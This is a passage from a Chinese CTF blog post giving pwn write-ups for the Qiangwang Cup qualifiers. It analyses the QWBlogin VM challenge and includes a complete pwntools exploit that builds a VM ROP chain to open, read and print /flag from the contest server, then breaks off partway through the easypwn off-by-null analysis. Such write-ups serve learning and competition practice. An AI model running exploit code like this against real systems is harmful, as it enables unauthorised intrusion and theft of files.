<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="强网杯线上赛部分pwn"><meta name="keywords" content="强网杯线上赛,pwn"><meta name="author" content="Nop"><meta name="copyright" content="Nop"><title>强网杯线上赛部分pwn | Nop's Blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop's Blog" type="application/atom+xml">
</head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#QWBlogin"><span class="toc-number">1.</span> <span class="toc-text">QWBlogin</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题过程"><span class="toc-number">1.1.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easypwn"><span class="toc-number">2.</span> <span class="toc-text">easypwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题过程-1"><span class="toc-number">2.1.</span> <span class="toc-text">解题过程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#direct"><span class="toc-number">3.</span> <span class="toc-text">direct</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路"><span class="toc-number">3.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#oldschool"><span class="toc-number">4.</span> <span class="toc-text">oldschool</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路-1"><span class="toc-number">4.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easyoverflow"><span class="toc-number">5.</span> <span class="toc-text">easyoverflow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路-2"><span class="toc-number">5.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easymessage"><span class="toc-number">6.</span> <span class="toc-text">easymessage</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路-3"><span class="toc-number">6.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babynotes"><span class="toc-number">7.</span> <span class="toc-text">babynotes</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解题思路-4"><span class="toc-number">7.1.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Just-a-Galgame"><span class="toc-number">8.</span> <span class="toc-text">Just_a_Galgame</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#解题思路-5"><span class="toc-number">9.</span> <span class="toc-text">解题思路</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://n0nop.com/img/avatar.jpg"></div><div class="author-info__name text-center">Nop</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">27</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">6</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">6</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://n0nop.com/img/background.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Nop's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">强网杯线上赛部分pwn</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-26</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Competition/">Competition</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">5.4k</span><span class="post-meta__separator">|</span><span>Reading time: 27 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>pwn比赛，但是太弱了只能做简单的题，难题只能赛后学习别人的wp了；最后跟着队里打进了前十，大哥们太猛了！就简单记录一下自己做得题好了，本来是想着复现一些题的，但是时间上目前比较吃紧，以后有时间再看吧（咕咕咕）。</p>
<a id="more"></a>

<h1 id="QWBlogin"><a href="#QWBlogin" class="headerlink" title="QWBlogin"></a>QWBlogin</h1><h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li><p>vm pwn，分析一下binary：</p>
<p> 初始化的过程如下：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">v9 = (struc_pcb *)<span class="built_in">calloc</span>(<span class="number">0xD0</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  v9-&gt;code_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, ((*(_QWORD *)(v8 + <span class="number">14</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>);<span class="comment">// v8 + 6   ===&gt;    code data start</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v9-&gt;code_buf, &amp;v8[*(_QWORD *)(v8 + <span class="number">6</span>)], *(_QWORD *)(v8 + <span class="number">14</span>));<span class="comment">// v8 + 14   ===&gt;   code length</span></span><br><span class="line">  v9-&gt;code_size = ((*(_QWORD *)(v8 + <span class="number">14</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>;<span class="comment">// store code data size</span></span><br><span class="line">  v9-&gt;global_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, ((*(_QWORD *)(v8 + <span class="number">30</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>);<span class="comment">// v8 + 30   ===&gt;   global data size</span></span><br><span class="line">  <span class="built_in">memcpy</span>(v9-&gt;global_buf, &amp;v8[*(_QWORD *)(v8 + <span class="number">22</span>)], *(_QWORD *)(v8 + <span class="number">30</span>));<span class="comment">// v8 + 22   ===&gt;    global data start</span></span><br><span class="line">  v9-&gt;global_size = ((*(_QWORD *)(v8 + <span class="number">30</span>) &gt;&gt; <span class="number">12</span>) + <span class="number">1L</span>L) &lt;&lt; <span class="number">12</span>;<span class="comment">// store global data size</span></span><br><span class="line">  v9-&gt;stack_buf = <span class="built_in">calloc</span>(<span class="number">1u</span>LL, <span class="number">0x20000</span>uLL);     <span class="comment">// stack</span></span><br><span class="line">  v9-&gt;stack_size = <span class="number">0x20000</span>LL;</span><br><span class="line">  v9-&gt;_rsp = <span class="number">0x10000</span>LL;</span><br><span class="line">  v9-&gt;_rip = *(_QWORD *)(v8 + <span class="number">38</span>);              <span class="comment">// v8 + 38   ===&gt;   pc start</span></span><br><span class="line">  IO_FILE = (__int64)<span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(IO_FILE + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">  *(_DWORD *)IO_FILE = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)(IO_FILE + <span class="number">8</span>) = <span class="number">0L</span>L;</span><br><span class="line">  v3 = IO_FILE;</span><br><span class="line">  *(_QWORD *)(v3 + <span class="number">16</span>) = <span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  **(_DWORD **)(IO_FILE + <span class="number">16</span>) = <span class="number">1</span>;</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  v4 = *(_QWORD *)(IO_FILE + <span class="number">16</span>);</span><br><span class="line">  *(_QWORD *)(v4 + <span class="number">16</span>) = <span class="built_in">calloc</span>(<span class="number">0x18</span>uLL, <span class="number">1u</span>LL);</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) + <span class="number">16L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  **(_DWORD **)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) = <span class="number">2</span>;</span><br><span class="line">  *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(IO_FILE + <span class="number">16</span>) + <span class="number">16L</span>L) + <span class="number">8L</span>L) = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">while</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)vmstart(v9) )</span><br><span class="line">    ;</span><br></pre></td></tr></table></figure>

<p> 传入的<code>v9</code>为自定义的结构体，为了方便分析：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> struc_pcb       struc ; (<span class="keyword">sizeof</span>=<span class="number">0xD8</span>, mappedto_21)</span><br><span class="line"><span class="number">00000000</span> REG             dq <span class="number">16</span> dup(?)</span><br><span class="line"><span class="number">00000080</span> _rsp            dq ?</span><br><span class="line"><span class="number">00000088</span> field_88        dq ?</span><br><span class="line"><span class="number">00000090</span> _rip            dq ?</span><br><span class="line"><span class="number">00000098</span> rflag           dq ?</span><br><span class="line"><span class="number">000000</span>A0 code_size       dq ?</span><br><span class="line"><span class="number">000000</span>A8 code_buf        dq ?                    ; offset</span><br><span class="line"><span class="number">000000B</span>0 global_size     dq ?</span><br><span class="line"><span class="number">000000B</span>8 global_buf      dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>C0 stack_size      dq ?</span><br><span class="line"><span class="number">000000</span>C8 stack_buf       dq ?                    ; offset</span><br><span class="line"><span class="number">000000</span>D0 field_D0        dq ?</span><br><span class="line"><span class="number">000000</span>D8 struc_pcb       ends</span><br></pre></td></tr></table></figure>

<p> 基本上<code>test.bin</code>里面，<code>0x100 - 0x8B8</code>的位置就是<code>code segment</code>，<code>0x8B8 - 0x978</code>就是<code>bss segment</code>，栈是通过<code>calloc(1uLL, 0x20000uLL)</code>另外开辟的，栈底就是<code>0x20000</code>。</p>
<p> 指令部分简单贴一下当时做题的分析结果（有些指令逻辑是相同的，但是不影响）：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">[0]  [1]  [2]  [3]</span><br><span class="line">   0000 0000 0000 0000</span><br><span class="line">   [3] &#x3D;&#x3D;&gt; opcode            ins_len </span><br><span class="line">   		0x1, 2, 3, 4      0xB</span><br><span class="line">   		0x0, B, C, D, E   0x4</span><br><span class="line">   		0x5               [2] &#x3D;&#x3D; 0x1: 0x4</span><br><span class="line">   						  [2] &#x3D;&#x3D; 0x2: 0x5</span><br><span class="line">   						  [2] &#x3D;&#x3D; 0x3: 0x7</span><br><span class="line">   						  [2] &#x3D;&#x3D; 0x4: 0xB</span><br><span class="line">   		0x6 			  0x3</span><br><span class="line">   		0x7				  [2] &#x3D;&#x3D; 0x1: 0x3</span><br><span class="line">   						  [2] &#x3D;&#x3D; 0x2: 0x4</span><br><span class="line">   						  [2] &#x3D;&#x3D; 0x3: 0x6</span><br><span class="line">   						  [2] &#x3D;&#x3D; 0x4: 0xA</span><br><span class="line">   		0x8				  [1] &#x3D;&#x3D; 0x2: 0x2</span><br><span class="line">   						  		else: 0xA</span><br><span class="line">   		0x9				  [1] &#x3D;&#x3D; 0x2: 0x2</span><br><span class="line">   						  _rip &gt;&#x3D; size-10: 0x2</span><br><span class="line">   	</span><br><span class="line">    rflag:</span><br><span class="line">    8  &lt; (unsigned)</span><br><span class="line">    1  overflow</span><br><span class="line">    4  zero</span><br><span class="line">    2  res is negative (signed)</span><br><span class="line">    </span><br><span class="line">    1：mov指令</span><br><span class="line">    2：add</span><br><span class="line">    3：sub</span><br><span class="line">    4：mul</span><br><span class="line">    5：mul</span><br><span class="line">    6：mod</span><br><span class="line">    7：xor</span><br><span class="line">    8：or</span><br><span class="line">    9：and</span><br><span class="line">    A：shl</span><br><span class="line">    B：shr</span><br><span class="line">    C：not</span><br><span class="line">    D：pop</span><br><span class="line">    E：push</span><br><span class="line">    10：call</span><br><span class="line">    11：ret</span><br><span class="line">    12：cmp</span><br><span class="line">    13：jmp</span><br><span class="line">    14：jz</span><br><span class="line">    15：jnz</span><br><span class="line">    16：jg</span><br><span class="line">    17：jg</span><br><span class="line">    18：jle</span><br><span class="line">    19：jge</span><br><span class="line">    1A：ja</span><br><span class="line">    1B：ja</span><br><span class="line">    1C：jae</span><br><span class="line">    1D：jae</span><br><span class="line">    0x20：syscall</span><br><span class="line">    </span><br><span class="line">    for 0x20:</span><br><span class="line">    20 xx  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 3,  args: r1              close</span><br><span class="line">    20 08  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 1,  args: r1, r2, r3      read to virtual bss</span><br><span class="line">   			  r0 &#x3D;&#x3D; 2,  args: r1, r2, r3      write from virtual bss</span><br><span class="line">    20 09  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 1,  args: r1, r2, r3      read to virtual stack</span><br><span class="line">   			  r0 &#x3D;&#x3D; 2,  args: r1, r2, r3      write from virtual stack</span><br><span class="line">    20 10  &#x3D;&#x3D;&#x3D;&gt;  r0 &#x3D;&#x3D; 0,  args: r1, r2          open</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于本身是个pwn题，如果用我的龟速去写个脚本翻译指令就太慢了，索性就直接颅内翻译+动态调试验证，其实逻辑也十分简单。</p>
</li>
<li><p>首先<code>test.bin</code>是通过<code>call</code>指令进入主函数，然后要求输入<code>password</code>然后进行<code>check</code>前<code>3</code>个字符是单独比较的，后面<code>32</code>个字符分成四组异或后再比较，基本遵从如下格式（<code>test.bin</code>里<code>0x22E</code>的位置）：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">01 15 00 01   &#x3D;&#x3D;&#x3D;&gt;   movb r0, 1</span><br><span class="line">01 25 01 00 00    &#x3D;&#x3D;&#x3D;&gt;   movw r1, 1</span><br><span class="line">01 25 02 40 00    &#x3D;&#x3D;&#x3D;&gt;   movw r2, 0x40</span><br><span class="line">01 15 03 21   &#x3D;&#x3D;&#x3D;&gt;   movb r3, 0x21</span><br><span class="line">20 08    &#x3D;&#x3D;&#x3D;&gt;   read</span><br><span class="line">07 40 08 08    &#x3D;&#x3D;&#x3D;&gt;   xor r8, r8  </span><br><span class="line">01 41 08 40 00 00 00 00 00 00 00    &#x3D;&#x3D;&#x3D;&gt;   movq r8, 0x40</span><br><span class="line">01 45 09 CD AB 27 98 12 34 72 42    &#x3D;&#x3D;&#x3D;&gt;   movq r9, 0x427234129827ABCD</span><br><span class="line">07 40 08 09   &#x3D;&#x3D;&#x3D;&gt;   xor r8, r9</span><br><span class="line">12 45 08 8A 9B 17 DC 40 07 24 10    &#x3D;&#x3D;&#x3D;&gt;   cmp r8, 0x10240740DC179B8A</span><br><span class="line">14 17 02   &#x3D;&#x3D;&#x3D;&gt;   jz 2</span><br><span class="line">00 0A   &#x3D;&#x3D;&#x3D;&gt;   exit</span><br></pre></td></tr></table></figure>

<p> 那么简单写个逆推脚本：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">res = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">res += <span class="string">"QWQ"</span></span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0xCD</span>, <span class="number">0xAB</span>, <span class="number">0x27</span>, <span class="number">0x98</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x72</span>, <span class="number">0x42</span>]</span><br><span class="line">a2 = [<span class="number">0x8A</span>, <span class="number">0x9B</span>, <span class="number">0x17</span>, <span class="number">0xDC</span>, <span class="number">0x40</span>, <span class="number">0x07</span>, <span class="number">0x24</span>, <span class="number">0x10</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x41</span>, <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x12</span>, <span class="number">0x74</span>, <span class="number">0x12</span>]</span><br><span class="line">a2 = [<span class="number">0xFA</span>, <span class="number">0xED</span>, <span class="number">0x70</span>, <span class="number">0x5E</span>, <span class="number">0x70</span>, <span class="number">0x22</span>, <span class="number">0x3A</span>, <span class="number">0x21</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0x23</span>, <span class="number">0xC1</span>, <span class="number">0xAB</span>, <span class="number">0x12</span>, <span class="number">0x58</span>, <span class="number">0x96</span>, <span class="number">0x34</span>, <span class="number">0x86</span>]</span><br><span class="line">a2 = [<span class="number">0x77</span>, <span class="number">0xB3</span>, <span class="number">0xD2</span>, <span class="number">0x20</span>, <span class="number">0x08</span>, <span class="number">0xE1</span>, <span class="number">0x5A</span>, <span class="number">0xA7</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">a1 = [<span class="number">0x9A</span>, <span class="number">0x78</span>, <span class="number">0x36</span>, <span class="number">0x12</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0x32</span>, <span class="number">0x12</span>]</span><br><span class="line">a2 = [<span class="number">0xDD</span>, <span class="number">0x37</span>, <span class="number">0x71</span>, <span class="number">0x5D</span>, <span class="number">0x3F</span>, <span class="number">0x59</span>, <span class="number">0x75</span>, <span class="number">0x5D</span>]</span><br><span class="line">res += <span class="string">''</span>.join([chr(a1[i] ^ a2[i]) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)])</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>

<p> 即可得到：<code>QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO</code>。</p>
</li>
<li><p>接下来<code>check</code>通过，可以向栈上写入<code>0x800</code>bytes数据，之后通过<code>ret</code>，也就是从栈上取出地址再跳转。而写入的<code>0x800</code>字节可以覆盖这个返回地址，那么这样看来这个题目其实就是需要通过在vm中实现rop。</p>
</li>
<li><p>根据前面所分析的，存在<code>open</code>，<code>read</code>，<code>write</code>调用，而且对跳转地址有范围内的检查，所以只能在载入的<code>test.bin</code>寻找vm gadget，然后通过orw的方式获取flag。</p>
<p> 而其实也不难注意到<code>test.bin</code>中存在一段比较可疑的数据，仔细查看可以发现</p>
<p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/pop_regs.png" alt="pop_regs"></p>
<p> 存在上图这样的<code>pop r0; ret;</code>和<code>pop r1; ret;</code>等gadget，也就是说<code>r0, r1, r2, r3</code>都是可控的，满足了0x20调用的条件，而且：</p>
<p> <img src="/2020/08/26/%E5%BC%BA%E7%BD%91%E6%9D%AF%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86pwn/syscall.png" alt="syscall"></p>
<p> 同时存在0x20调用。</p>
</li>
<li><p>那么就很简单了，通过构造rop的方式来orw即可。</p>
</li>
<li><p>exp：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">'47.94.20.173'</span>, <span class="number">32142</span>)</span><br><span class="line"></span><br><span class="line">pop_r0 = <span class="number">0x2F5</span></span><br><span class="line">pop_r1 = <span class="number">0x377</span></span><br><span class="line">pop_r2 = <span class="number">0x45C</span></span><br><span class="line">pop_r3 = <span class="number">0x4E1</span></span><br><span class="line">syscall = <span class="number">0x5B1</span> <span class="comment"># read is 1, write is 2</span></span><br><span class="line">syscall_open = <span class="number">0x6ED</span></span><br><span class="line"></span><br><span class="line">password = <span class="string">'QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO'</span></span><br><span class="line">p.sendafter(<span class="string">"password: \n"</span>, password)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">0x108</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">1</span>, pop_r1, <span class="number">0</span>, pop_r2, <span class="number">0</span>, pop_r3, <span class="number">0x8</span>, syscall]) <span class="comment"># read</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">0</span>, pop_r1, <span class="number">0</span>, pop_r2, <span class="number">0</span>, syscall_open]) <span class="comment"># open </span></span><br><span class="line">payload += flat([pop_r0, <span class="number">1</span>, pop_r1, <span class="number">4</span>, pop_r2, <span class="number">0x10</span>, pop_r3, <span class="number">0x40</span>, syscall]) <span class="comment"># read</span></span><br><span class="line">payload += flat([pop_r0, <span class="number">2</span>, pop_r1, <span class="number">1</span>, pop_r2, <span class="number">0x10</span>, pop_r3, <span class="number">0x40</span>, syscall]) <span class="comment"># write</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">"PWNITNOW!GOGO!"</span>, payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">"/flag\x00"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



</li>
</ol>
<h1 id="easypwn"><a href="#easypwn" class="headerlink" title="easypwn"></a>easypwn</h1><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><ol>
<li><p>首先binary通过<code>mallopt(1, 0)</code>禁用了fastbin，但是在<code>read_str</code>中存在一个<code>off by null</code>：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">read_str</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">-1</span>; ; *(_BYTE *)(a1 + i) = buf )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = i;</span><br><span class="line">    <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a2 + <span class="number">1</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - <span class="number">1</span> == v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      buf = <span class="number">0</span>;</span><br><span class="line">      *(_BYTE *)(a1 + ++i) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">int</span>)<span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL) &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="number">10</span> 